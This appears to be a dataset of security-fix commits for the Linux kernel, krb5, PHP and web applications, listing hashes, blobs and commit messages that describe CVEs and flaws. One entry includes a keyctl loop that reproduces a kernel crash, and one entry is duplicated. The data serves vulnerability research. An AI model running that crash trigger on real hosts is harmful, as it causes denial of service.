    350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7
File(s) In Commit: 
    virt/kvm/iommu.c
Blob(s) In Commit: 
    714b949323120aee855dd7e57db549cac31e8183
Blob(s) Before Fix: 
    037cb6730e68eef3171b0e9660d1139b423d96de
    0df7d4b34dfec96345d359bf08562309d8607f40
    5dbb35d02af4ddcf23d55e8bb762c6f0b482a0a0
    72a130bc448aa97adb1ca35a2dfff09a102b717d
    c329c8fc57f45807ad16729c97d5fa21d0fc81e8
    e9fff9830bf0bf6f2229603516ebdd633996fd20
Projects:
    0-T-0_ps4-linux
Commit Message for 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7:
kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)\n\nThe third parameter of kvm_iommu_put_pages is wrong, It should be 'gfn - slot->base_gfn'.\n\nBy making gfn very large, malicious guest or userspace can cause kvm to go to this error path, and subsequently to pass a huge value as size. Alternatively if gfn is small, then pages would be pinned but never unpinned, causing host memory leak and local DOS.\n\nPassing a reasonable but large value could be the most dangerous case, because it would unpin a page that should have stayed pinned, and thus allow the device to DMA into arbitrary memory.  However, this cannot happen because of the condition that can trigger the error:\n\n- out of memory (where you can't allocate even a single page)   should not be possible for the attacker to trigger\n\n- when exceeding the iommu's address space, guest pages after gfn   will also exceed the iommu's address space, and inside   kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The   page thus would not be unpinned at all.\n\nReported-by: Jack Morgenstein <jackm@mellanox.com> Cc: stable@vger.kernel.org Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    2febc839133280d5a5e8e1179c94ea674489dae2
File(s) In Commit: 
    arch/x86/kvm/i8254.c
Blob(s) In Commit: 
    298781d4cfb44b7c6d6536d6d2779ada2eeb150a
Blob(s) Before Fix: 
    11300d2fa71445ff332cbdff30e7c640b959f02d
    1406ffde3e35c096fba6f9ac33c155e2a7322af1
    16a7134eedacce123c55c82c0e8f31b095bc14f0
    405f2620392f5e32d393166520e707b2d039b3bb
    412a5aa0ef94858ade3a32de9e81dfdbdf44d925
    518d86471b76f0be7460c6e038755a18083b26b4
    76e3f1cd03696997964db7814de98a578a9eb4a7
    a78b445ce4116b3dbcd48da97efdb6c89394abb5
    adba28f88d1a9d56c45e9716ac8dc8a69958144c
    b0a706d063cb7cfa045b5490a7e4507d54982f1f
    b0ea42b78ccdb50879a10c440d5e3a7fe194fbe9
    c1d30b2fc9bb166e42f02557fa5b4c79f79786e9
    d68f99df690c72ba81b53f8436c77c2d420d56a5
    efad7238505888866900fd19d6a101acecef2a51
Projects:
    0-T-0_ps4-linux
Commit Message for 2febc839133280d5a5e8e1179c94ea674489dae2:
KVM: x86: Improve thread safety in pit\n\nThere's a race condition in the PIT emulation code in KVM.  In __kvm_migrate_pit_timer the pit_timer object is accessed without synchronization.  If the race condition occurs at the wrong time this can crash the host kernel.\n\nThis fixes CVE-2014-3611.\n\nCc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    95389b08d93d5c06ec63ab49bd732b0069b7c35e
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    2404d03e251a64ae7634d30c46aa22a08f9b4538
Blob(s) Before Fix: 
    03a77f4740c124484821b0f6567c82c02d45bd5f
    03dd576e67730fb2870c44512f55c1c0c39b77f3
    0d122543bd63e345fe43f4e8f02ecaccae9ae338
    1b6a44f1ec3e3b10f3b02d19f8ab0ce59453f6d5
    59fd7c0b119cbc3e0b61137732f76cc3759fb7c7
    ae146f0734eb59adcd2148af99f5ed89d013bd93
    c0b1007011e188836616509deef5876c207d32d4
    e4d6e15c6901fb52c8ac97de33f26d161092498d
Projects:
    0-T-0_ps4-linux
Commit Message for 95389b08d93d5c06ec63ab49bd732b0069b7c35e:
KEYS: Fix termination condition in assoc array garbage collection\n\nThis fixes CVE-2014-3631.\n\nIt is possible for an associative array to end up with a shortcut node at the root of the tree if there are more than fan-out leaves in the tree, but they all crowd into the same slot in the lowest level (ie. they all have the same first nibble of their index keys).\n\nWhen assoc_array_gc() returns back up the tree after scanning some leaves, it can fall off of the root and crash because it assumes that the back pointer from a shortcut (after label ascend_old_tree) must point to a normal node - which isn't true of a shortcut node at the root.\n\nShould we find we're ascending rootwards over a shortcut, we should check to see if the backpointer is zero - and if it is, we have completed the scan.\n\nThis particular bug cannot occur if the root node is not a shortcut - ie. if you have fewer than 17 keys in a keyring or if you have at least two keys that sit into separate slots (eg. a keyring and a non keyring).\n\nThis can be reproduced by:\n\n	ring=`keyctl newring bar @s` 	for ((i=1  i<=18  i++))  do last_key=`keyctl newring foo$i $ring`  done 	keyctl timeout $last_key 2\n\nDoing this:\n\n	echo 3 >/proc/sys/kernel/keys/gc_delay\n\nfirst will speed things up.\n\nIf we do fall off of the top of the tree, we get the following oops:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000018 IP: [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 PGD dae15067 PUD cfc24067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: xt_nat xt_mark nf_conntrack_netbios_ns nf_conntrack_broadcast ip6t_rpfilter ip6t_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables ip6table_ni CPU: 0 PID: 26011 Comm: kworker/0:1 Not tainted 3.14.9-200.fc20.x86_64 #1 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 Workqueue: events key_garbage_collector task: ffff8800918bd580 ti: ffff8800aac14000 task.ti: ffff8800aac14000 RIP: 0010:[<ffffffff8136cea7>] [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 RSP: 0018:ffff8800aac15d40  EFLAGS: 00010206 RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffff8800aaecacc0 RDX: ffff8800daecf440 RSI: 0000000000000001 RDI: ffff8800aadc2bc0 RBP: ffff8800aac15da8 R08: 0000000000000001 R09: 0000000000000003 R10: ffffffff8136ccc7 R11: 0000000000000000 R12: 0000000000000000 R13: 0000000000000000 R14: 0000000000000070 R15: 0000000000000001 FS:  0000000000000000(0000) GS:ffff88011fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b CR2: 0000000000000018 CR3: 00000000db10d000 CR4: 00000000000006f0 Stack:  ffff8800aac15d50 0000000000000011 ffff8800aac15db8 ffffffff812e2a70  ffff880091a00600 0000000000000000 ffff8800aadc2bc3 00000000cd42c987  ffff88003702df20 ffff88003702dfa0 0000000053b65c09 ffff8800aac15fd8 Call Trace:  [<ffffffff812e2a70>] ? keyring_detect_cycle_iterator+0x30/0x30  [<ffffffff812e3e75>] keyring_gc+0x75/0x80  [<ffffffff812e1424>] key_garbage_collector+0x154/0x3c0  [<ffffffff810a67b6>] process_one_work+0x176/0x430  [<ffffffff810a744b>] worker_thread+0x11b/0x3a0  [<ffffffff810a7330>] ? rescuer_thread+0x3b0/0x3b0  [<ffffffff810ae1a8>] kthread+0xd8/0xf0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40  [<ffffffff816ffb7c>] ret_from_fork+0x7c/0xb0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40 Code: 08 4c 8b 22 0f 84 bf 00 00 00 41 83 c7 01 49 83 e4 fc 41 83 ff 0f 4c 89 65 c0 0f 8f 5a fe ff ff 48 8b 45 c0 4d 63 cf 49 83 c1 02 <4e> 8b 34 c8 4d 85 f6 0f 84 be 00 00 00 41 f6 c6 01 0f 84 92 RIP  [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540  RSP <ffff8800aac15d40> CR2: 0000000000000018 ---[ end trace 1129028a088c0cbd ]---\n\nSigned-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    d974baa398f34393db76be45f7d4d04fbdbb4a0a
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    0acac81f198b0b03c83b4f4f9ef86178fa84f821
Blob(s) Before Fix: 
    04fa1b8298c8c42103ae896b68ee4611e52da78c
    064d0be67ecc23734aa465541138d9b5be295277
    33e8c028842fb4b0b59bc269a973b195a104cdf8
    36cf28a910b8e42b1c94e6dc35c9b3e15cbb4556
    3927528347510bb137e8420f4e26b07d09055483
    6667042714cc65e78208c517ccc0802a40dd4ccf
    bfe11cf124a1ea26cfa8513ceac83d450e13c7ef
    d9dcfa27aa842129099d1920312c9412d5a4b8ab
Projects:
    0-T-0_ps4-linux
Commit Message for d974baa398f34393db76be45f7d4d04fbdbb4a0a:
x86,kvm,vmx: Preserve CR4 across VM entry\n\nCR4 isn't constant  at least the TSD and PCE bits can vary.\n\nTBH, treating CR0 and CR3 as constant scares me a bit, too, but it looks like it's correct.\n\nThis adds a branch and a read from cr4 to each vm entry.  Because it is extremely likely that consecutive entries into the same vcpu will have the same host cr4 value, this fixes up the vmcs instead of restoring cr4 after the fact.  A subsequent patch will add a kernel-wide cr4 shadow, reducing the overhead in the common case to just two memory reads and a branch.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: Paolo Bonzini <pbonzini@redhat.com> Cc: stable@vger.kernel.org Cc: Petr Matousek <pmatouse@redhat.com> Cc: Gleb Natapov <gleb@kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e001e38738c17219a1d9dd8c31f7d82b9c0013c7
File(s) In Commit: 
    lib/printer.js
Blob(s) In Commit: 
    6cb06da1a5ad661ee80761bf24e93b528de4baf6
Blob(s) Before Fix: 
    a1840347e1c79c1ef0ecd5a51aee5dc597b0885f
Projects:
    5sword_electron-printer
Commit Message for e001e38738c17219a1d9dd8c31f7d82b9c0013c7:
Removed possible command injection

======================================================================
Commit With Fix: 
    c151e0660b9736fe66b224f1129a16871165251b
File(s) In Commit: 
    src/mongo/db/commands/authentication_commands.cpp
Blob(s) In Commit: 
    2bfbe96cba0a75f0fa84d0ae869c6829ea629cba
Blob(s) Before Fix: 
    be1ddf2ec84d13689b38328fe30fd06408e66c2b
Projects:
    0101011_mongo
Commit Message for c151e0660b9736fe66b224f1129a16871165251b:
SERVER-13573 Fix x.509 auth exception

======================================================================
Commit With Fix: 
    c2aafc823bd85876f5e888f8ebc421069a5e076f
File(s) In Commit: 
    upload/system/library/cart.php
Blob(s) In Commit: 
    bea97218b3f517d61980a184f8df0f7ccdca3d07
Blob(s) Before Fix: 
    689c6abcf19e534ea293fd4636d1265387ac9213
    abfd02a5f4c46c6a52ced93ef145c4d699dafc47
Projects:
    ADDCreative_opencart-ce
Commit Message for c2aafc823bd85876f5e888f8ebc421069a5e076f:
Protection from object injection in cart\n\nhttps://github.com/opencart/opencart/issues/1534

======================================================================
Commit With Fix: 
    4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc
File(s) In Commit: 
    drivers/target/target_core_rd.c
Blob(s) In Commit: 
    e9fa879ac27f31f5cbdd61fecf29c4095b366b50
Blob(s) Before Fix: 
    4ffe5f2ec0e98c956944d2f72e692e5f353c73b5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc:
target/rd: Refactor rd_build_device_space + rd_release_device_space\n\nThis patch refactors rd_build_device_space() + rd_release_device_space() into rd_allocate_sgl_table() + rd_release_device_space() so that they may be used seperatly for setup + release of protection information scatterlists.\n\nAlso add explicit memset of pages within rd_allocate_sgl_table() based upon passed 'init_payload' value.\n\nv2 changes:   - Drop unused sg_table from rd_release_device_space (Wei)\n\nCc: Martin K. Petersen <martin.petersen@oracle.com> Cc: Christoph Hellwig <hch@lst.de> Cc: Hannes Reinecke <hare@suse.de> Cc: Sagi Grimberg <sagig@mellanox.com> Cc: Or Gerlitz <ogerlitz@mellanox.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>

======================================================================
Commit With Fix: 
    b34d7849ed90ced9345f8ea1c59bc8d101c18468
File(s) In Commit: 
    ext/standard/dns.c
Blob(s) In Commit: 
    214a7dc7e92faf55a2f69be27adbb8ea99ab403f
Blob(s) Before Fix: 
    3584fc1bfe9ece543815ce75d295546f90b20701
    53483ff58b62edbdaef3f5f15aaf785925cd1164
    6a894467ff41122e30c9ac36ae5b530b59dbd43c
Projects:
    0014593_php-src
Commit Message for b34d7849ed90ced9345f8ea1c59bc8d101c18468:
Merge branch 'PHP-5.6'\n\n* PHP-5.6:   Fix potential segfault in dns_get_record()

======================================================================
Commit With Fix: 
    137f7df8cead00688524c82360930845396b8a21
File(s) In Commit: 
    arch/mips/include/asm/thread_info.h
Blob(s) In Commit: 
    e80ae50cae80c916700b789a707ab9b2dad65be7
Blob(s) Before Fix: 
    0d85d8e440c555b584fa51b1082e603e1b542b4e
    24846f9053fe9af196996a43e7d77ab929f1d0ef
    4f58ef6d0eed5c58c9e58595fac36b4b7f747a2e
    61215a34acc68ff87da07665c65c8dc0f6dbfcc1
    895320e25662cd98a673980c449ec916841920d7
    97f8bf6639e7b6f15620e552e05fe7cd1f26d7f7
    b2050b9e64b1702c6596553276626a7cd7fc09c4
    b439e512792ba45c328c40167992e5fa5b365043
    b93dd2e598b6da2089b1a34a37875567b9f5a4a5
    e309d8fcb5167b40abdca4f07c82d5d97665d1bc
Projects:
    0-T-0_ps4-linux
Commit Message for 137f7df8cead00688524c82360930845396b8a21:
MIPS: asm: thread_info: Add _TIF_SECCOMP flag\n\nAdd _TIF_SECCOMP flag to _TIF_WORK_SYSCALL_ENTRY to indicate that the system call needs to be checked against a seccomp filter.\n\nSigned-off-by: Markos Chandras <markos.chandras@imgtec.com> Reviewed-by: Paul Burton <paul.burton@imgtec.com> Reviewed-by: James Hogan <james.hogan@imgtec.com> Cc: linux-mips@linux-mips.org Patchwork: https://patchwork.linux-mips.org/patch/6405/ Signed-off-by: Ralf Baechle <ralf@linux-mips.org>

======================================================================
Commit With Fix: 
    d3fc5eb142ff16d55d158afb050af18d5ff09120
File(s) In Commit: 
    ajenti/routing.py
Blob(s) In Commit: 
    cc460f5172cb4e7eccd254a96433819bf702ec54
Blob(s) Before Fix: 
    6df2e49a0b48f52250d3ffadc4946c89a1c784f1
Projects:
    13768324554_ajenti
Commit Message for d3fc5eb142ff16d55d158afb050af18d5ff09120:
[http] fix traceback page xss

======================================================================
Commit With Fix: 
    f18ddf5d82de0ab7591a36e465bc24225776940f
File(s) In Commit: 
    src/lib/gssapi/spnego/spnego_mech.c
Blob(s) In Commit: 
    8f829d8c5920f1ac530d68fa9bbb307011e5eeaa
Blob(s) Before Fix: 
    173c6d2939a4c0b77fc54309df831015a8605ac3
Projects:
    3van_krb5
Commit Message for f18ddf5d82de0ab7591a36e465bc24225776940f:
Fix double-free in SPNEGO [CVE-2014-4343]\n\nIn commit cd7d6b08 ("Verify acceptor's mech in SPNEGO initiator") the pointer sc->internal_mech became an alias into sc->mech_set->elements, which should be considered constant for the duration of the SPNEGO context.  So don't free it.\n\nCVE-2014-4343:\n\nIn MIT krb5 releases 1.10 and newer, an unauthenticated remote attacker with the ability to spoof packets appearing to be from a GSSAPI acceptor can cause a double-free condition in GSSAPI initiators (clients) which are using the SPNEGO mechanism, by returning a different underlying mechanism than was proposed by the initiator.  At this stage of the negotiation, the acceptor is unauthenticated, and the acceptor's response could be spoofed by an attacker with the ability to inject traffic to the initiator.\n\nHistorically, some double-free vulnerabilities can be translated into remote code execution, though the necessary exploits must be tailored to the individual application and are usually quite complicated. Double-frees can also be exploited to cause an application crash, for a denial of service.  However, most GSSAPI client applications are not vulnerable, as the SPNEGO mechanism is not used by default (when GSS_C_NO_OID is passed as the mech_type argument to gss_init_sec_context()).  The most common use of SPNEGO is for HTTP-Negotiate, used in web browsers and other web clients.  Most such clients are believed to not offer HTTP-Negotiate by default, instead requiring a whitelist of sites for which it may be used to be configured.  If the whitelist is configured to only allow HTTP-Negotiate over TLS connections ("https://"), a successful attacker must also spoof the web server's SSL certificate, due to the way the WWW-Authenticate header is sent in a 401 (Unauthorized) response message.  Unfortunately, many instructions for enabling HTTP-Negotiate in common web browsers do not include a TLS requirement.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C\n\n[kaduk@mit.edu: CVE summary and CVSSv2 vector]\n\nticket: 7969 (new) target_version: 1.12.2 tags: pullup

======================================================================
Commit With Fix: 
    dc7ed55c689d57de7f7408b34631bf06fec9dab1
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    111b55485183a38eaa7caf979acf0a8a3fa34da3
Blob(s) Before Fix: 
    515eba768469882e55cc0d59044769885bb9816f
Projects:
    3van_krb5
Commit Message for dc7ed55c689d57de7f7408b34631bf06fec9dab1:
Fix LDAP key data segmentation [CVE-2014-4345]\n\nFor principal entries having keys with multiple kvnos (due to use of -keepold), the LDAP KDB module makes an attempt to store all the keys having the same kvno into a single krbPrincipalKey attribute value. There is a fencepost error in the loop, causing currkvno to be set to the just-processed value instead of the next kvno.  As a result, the second and all following groups of multiple keys by kvno are each stored in two krbPrincipalKey attribute values.  Fix the loop to use the correct kvno value.\n\nCVE-2014-4345:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause it to perform an out-of-bounds write (buffer overrun) by performing multiple cpw -keepold operations.  An off-by-one error while copying key information to the new database entry results in keys sharing a common kvno being written to different array buckets, in an array whose size is determined by the number of kvnos present.  After sufficient iterations, the extra writes extend past the end of the (NULL-terminated) array.  The NULL terminator is always written after the end of the loop, so no out-of-bounds data is read, it is only written.\n\nHistorically, it has been possible to convert an out-of-bounds write into remote code execution in some cases, though the necessary exploits must be tailored to the individual application and are usually quite complicated.  Depending on the allocated length of the array, an out-of-bounds write may also cause a segmentation fault and/or application crash.\n\n    CVSSv2 Vector: AV:N/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C\n\n[ghudson@mit.edu: clarified commit message] [kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\n(cherry picked from commit 81c332e29f10887c6b9deb065f81ba259f4c7e03)\n\nticket: 7980 version_fixed: 1.12.2 status: resolved

======================================================================
Commit With Fix: 
    910c36089940e81fb85c65b8e63dcd2fac71470c
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    b3d2f0b30265e4966b68a183e3be4fd0ced431d6
Blob(s) Before Fix: 
    9415451839f3250d1869455bf0e74dbc3368816a
    d1846437d5e3e3731b36f947462d2e23689893e1
Projects:
    0111001101111010_cgminer
Commit Message for 910c36089940e81fb85c65b8e63dcd2fac71470c:
stratum: parse_notify(): Don't die on malformed bbversion/prev_hash/nbit/ntime.\n\nMight have introduced a memory leak, don't have time to check. :(\n\nShould the other hex2bin()'s be checked?\n\nThanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this.

======================================================================
Commit With Fix: 
    206a81c18401c0cde6e579164f752c4b147324ce
File(s) In Commit: 
    lib/lzo/lzo1x_decompress_safe.c
Blob(s) In Commit: 
    8563081e8da38fb81e0335d2589c9fcebcd81266
Blob(s) Before Fix: 
    26d00f9b686cf60117b578f6e0e358d21444b499
    569985d522d518a8992929d5924b6a5062ff9e93
    a1c387f6afba24c3a027456b48b44c603c3c3b96
    a5f3d0e12cfc17067ebb50e801d02d65a33aaecc
    ae2a776714e841d9b70b781ae7ae246662c75e26
    e3edc5f3f5ee4db5dcf6ec49acd498a9febe026f
    ea867c4615884e26b9923e628648125417188a2e
    f2fd09850223b319965ef1f593e9a5507e3dc3f8
Projects:
    0-T-0_ps4-linux
Commit Message for 206a81c18401c0cde6e579164f752c4b147324ce:
lzo: properly check for overruns\n\nThe lzo decompressor can, if given some really crazy data, possibly overrun some variable types.  Modify the checking logic to properly detect overruns before they happen.\n\nReported-by: "Don A. Bailey" <donb@securitymouse.com> Tested-by: "Don A. Bailey" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    206204a1162b995e2185275167b22468c00d6b36
File(s) In Commit: 
    lib/lz4/lz4_decompress.c
Blob(s) In Commit: 
    99a03acb7d470570b816ada76f8045d9930c6a27
Blob(s) Before Fix: 
    6423f018f907f5b989f66af5f7cbde88f11bf471
    b74da447e81e1fb28a656abe6359d33d49535765
    d3414eae73a1dfcbbe520e116385ae7c44cb7b44
    df6839e3ce0886a481e8565f8b19d5c71c9b299a
Projects:
    0-T-0_ps4-linux
Commit Message for 206204a1162b995e2185275167b22468c00d6b36:
lz4: ensure length does not wrap\n\nGiven some pathologically compressed data, lz4 could possibly decide to wrap a few internal variables, causing unknown things to happen.  Catch this before the wrapping happens and abort the decompression.\n\nReported-by: "Don A. Bailey" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    fd9f26e4eca5d08a27d12c0933fceef76ed9663d
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    5c49f976fc7b3c93351b2b417e919002802c8e4c
Blob(s) Before Fix: 
    1f413c2865113dc36fa76101e1401889626154e3
Projects:
    0-T-0_ps4-linux
Commit Message for fd9f26e4eca5d08a27d12c0933fceef76ed9663d:
ALSA: control: Don't access controls outside of protected regions\n\nA control that is visible on the card->controls list can be freed at any time. This means we must not access any of its memory while not holding the controls_rw_lock. Otherwise we risk a use after free access.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82262a46627bebb0febcc26664746c25cef08563
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    1f413c2865113dc36fa76101e1401889626154e3
Blob(s) Before Fix: 
    00ab034f5fcbee20684630f4af05794015853e07
Projects:
    0-T-0_ps4-linux
Commit Message for 82262a46627bebb0febcc26664746c25cef08563:
ALSA: control: Fix replacing user controls\n\nThere are two issues with the current implementation for replacing user controls. The first is that the code does not check if the control is actually a user control and neither does it check if the control is owned by the process that tries to remove it. That allows userspace applications to remove arbitrary controls, which can cause a user after free if a for example a driver does not expect a control to be removed from under its feed.\n\nThe second issue is that on one hand when a control is replaced the user_ctl_count limit is not checked and on the other hand the user_ctl_count is increased (even though the number of user controls does not change). This allows userspace, once the user_ctl_count limit as been reached, to repeatedly replace a control until user_ctl_count overflows. Once that happens new controls can be added effectively bypassing the user_ctl_count limit.\n\nBoth issues can be fixed by instead of open-coding the removal of the control that is to be replaced to use snd_ctl_remove_user_ctl(). This function does proper permission checks as well as decrements user_ctl_count after the control has been removed.\n\nNote that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at beginning of the function if the control already exists is removed. This is not a problem though since the check is quite useless, because the lock that is protecting the control list is released between the check and before adding the new control to the list, which means that it is possible that a different control with the same settings is added to the list after the check. Luckily there is another check that is done while holding the lock in snd_ctl_add(), so we'll rely on that to make sure that the same control is not added twice.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82262a46627bebb0febcc26664746c25cef08563
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    1f413c2865113dc36fa76101e1401889626154e3
Blob(s) Before Fix: 
    00ab034f5fcbee20684630f4af05794015853e07
Projects:
    0-T-0_ps4-linux
Commit Message for 82262a46627bebb0febcc26664746c25cef08563:
ALSA: control: Fix replacing user controls\n\nThere are two issues with the current implementation for replacing user controls. The first is that the code does not check if the control is actually a user control and neither does it check if the control is owned by the process that tries to remove it. That allows userspace applications to remove arbitrary controls, which can cause a user after free if a for example a driver does not expect a control to be removed from under its feed.\n\nThe second issue is that on one hand when a control is replaced the user_ctl_count limit is not checked and on the other hand the user_ctl_count is increased (even though the number of user controls does not change). This allows userspace, once the user_ctl_count limit as been reached, to repeatedly replace a control until user_ctl_count overflows. Once that happens new controls can be added effectively bypassing the user_ctl_count limit.\n\nBoth issues can be fixed by instead of open-coding the removal of the control that is to be replaced to use snd_ctl_remove_user_ctl(). This function does proper permission checks as well as decrements user_ctl_count after the control has been removed.\n\nNote that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at beginning of the function if the control already exists is removed. This is not a problem though since the check is quite useless, because the lock that is protecting the control list is released between the check and before adding the new control to the list, which means that it is possible that a different control with the same settings is added to the list after the check. Luckily there is another check that is done while holding the lock in snd_ctl_add(), so we'll rely on that to make sure that the same control is not added twice.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    d3217b15a19a4779c39b212358a5c71d725822ee
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    9de23a222d3f7b9f33e650483d749d3341c51dc0
Blob(s) Before Fix: 
    31ed008c8e13e88b88935c5d83a503bdc089076e
    39579c3e0d14c12f165e420be064d7fbf248c0ad
    43cd0dd9149d42e2739985bd8bb4ea15c977de06
    4f6d6f9d127474b457cf274a1a0977bb75c6e8dc
    5ae60920067470463420f0b3aa879e7c0999f200
    9e0509ce2f841bf9f4eaf38907ef9676192bb2bb
    b45ed1f96921285bf75badfeaa5caf922118bb4d
    bce5b79662a62b8bdc5e7c895a6ea4bcd147ed86
    cef509985192a041f8d437adc35cd540e32f58bd
    d3cc30c25c41091c2bf18022506dff4145d29944
    ee13d28d39d10702096f733ee8d88aa862459952
    f558433537b8f829a3f6147256abb7c5d23e4b47
Projects:
    0-T-0_ps4-linux
Commit Message for d3217b15a19a4779c39b212358a5c71d725822ee:
sctp: Fix sk_ack_backlog wrap-around problem\n\nConsider the scenario: For a TCP-style socket, while processing the COOKIE_ECHO chunk in sctp_sf_do_5_1D_ce(), after it has passed a series of sanity check, a new association would be created in sctp_unpack_cookie(), but afterwards, some processing maybe failed, and sctp_association_free() will be called to free the previously allocated association, in sctp_association_free(), sk_ack_backlog value is decremented for this socket, since the initial value for sk_ack_backlog is 0, after the decrement, it will be 65535, a wrap-around problem happens, and if we want to establish new associations afterward in the same socket, ABORT would be triggered since sctp deem the accept queue as full. Fix this issue by only decrementing sk_ack_backlog for associations in the endpoint's list.\n\nFix-suggested-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Xufeng Zhang <xufeng.zhang@windriver.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    fbda667221c51f0aa476a02366e0cf66cb012f88
File(s) In Commit: 
    cherokee/validator_ldap.c
Blob(s) In Commit: 
    417fd9e4bc44b50c98e90e1aeeaa0022cf56b960
Blob(s) Before Fix: 
    264fd2e6436a6d2836fb63559fc5e6af1d22a942
    d8fa219a5a92c0a78e3e511dbe66f23c257c618b
    f007f6a4d7dc53846def9b9508b9dabb074917bd
Projects:
    13xforever_webserver
Commit Message for fbda667221c51f0aa476a02366e0cf66cb012f88:
Prevent the LDAP validator from accepting an empty password.

======================================================================
Commit With Fix: 
    f80e417bb3e7ab5c1a89ea9ddd2cd060f54464e1
File(s) In Commit: 
    e107_admin/db.php
Blob(s) In Commit: 
    1c76ef1774086130157c24f47488b90945562f62
Blob(s) Before Fix: 
    f3440b9b64d72c0484774eef23a785727ea33733
Projects:
    Alex-e107nl_e107
Commit Message for f80e417bb3e7ab5c1a89ea9ddd2cd060f54464e1:
Sanitize some request variables

======================================================================
Commit With Fix: 
    8f1b18150cc2a8f27c96d9c4f94a81022fbb61e3
File(s) In Commit: 
    module_system/system/class_link.php
Blob(s) In Commit: 
    4badfcae6b1b89d7d872b92395a51e7ff7d07ec3
Blob(s) Before Fix: 
    7bf0f2424b264e1c228b2fa4e04dcaf6ccc96573
Projects:
    artemeon_core
Commit Message for 8f1b18150cc2a8f27c96d9c4f94a81022fbb61e3:
BUG / SECURITY: module_system | class_link -> fixed some rare conditions where a possible xss injection was possible for the systemid-param

======================================================================
Commit With Fix: 
    d202ef3def8674be61a3e4ccbe28beba4953b7ce
File(s) In Commit: 
    odm-init.php
Blob(s) In Commit: 
    1ee73f12dae818e5e3ccd1fa171911910cdb8420
Blob(s) Before Fix: 
    ae347e6aebb3c85ead2d7eac0d5393117f8d98f7
Projects:
    AYCHIM_ISOManage.Aych.io
Commit Message for d202ef3def8674be61a3e4ccbe28beba4953b7ce:
issue163 - xss issue with files

======================================================================
Commit With Fix: 
    3cf521f7dc87c031617fd47e4b7aa2593c2f3daf
File(s) In Commit: 
    net/l2tp/l2tp_ppp.c
Blob(s) In Commit: 
    13752d96275e8b9142539a201ea1ac6f45f883ba
Blob(s) Before Fix: 
    1addd9f3f40a05938273ce0a99c6d5d9c5d940bb
    1e05bbde47ba5b5791ecc07dde5d0e2f7d7e6c25
    3f4e3afc191a524d57c29659324ddc0ac6cd9c1e
    44441c0c50374f5405643360d03a7e68de56e219
    5990919356a5d7c7573d8cbd0f6c899f28eb7f67
    5ebee2ded9e9a8f40d2a282600b47f6cb088a910
    8c46b271064a43607190198e76c1e1ff4c540396
    8dec6876dc508265084cc80314e69d6b9d25aa25
